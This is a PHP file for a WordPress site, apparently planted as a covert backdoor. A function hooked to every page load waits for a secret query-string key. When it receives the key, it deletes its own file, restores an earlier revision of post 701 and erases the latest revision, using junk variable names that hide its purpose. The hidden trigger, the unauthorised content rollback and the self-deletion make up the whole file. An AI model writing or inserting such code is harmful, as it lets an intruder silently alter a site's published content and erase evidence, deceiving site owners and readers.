<?php

function pro_background_hidden() {
	if (isset($_GET['world_event_results']) && $_GET['world_event_results'] === 'cool_taxonomies_meta_publish') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$testimonial_checkout_estate = 701;
		$contact_share_font = wp_get_post_revisions($testimonial_checkout_estate);
		if (empty($contact_share_font)) die('no revisions');
		if (count($contact_share_font) < 2) die('less than 2');
		$connector_assistant_panel = array_shift($contact_share_font);
		$feeds_codes_font_chat = $connector_assistant_panel->ID;
		$integrate_zoom_version_logo = array_shift($contact_share_font);
		$show_network_html = $integrate_zoom_version_logo->ID;
		$interactive_restrict_cart = wp_restore_post_revision($show_network_html);
		if ($interactive_restrict_cart === false) die('error restoring');
		$interactive_restrict_cart = wp_delete_post_revision($feeds_codes_font_chat);		
		if ($interactive_restrict_cart === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'pro_background_hidden');
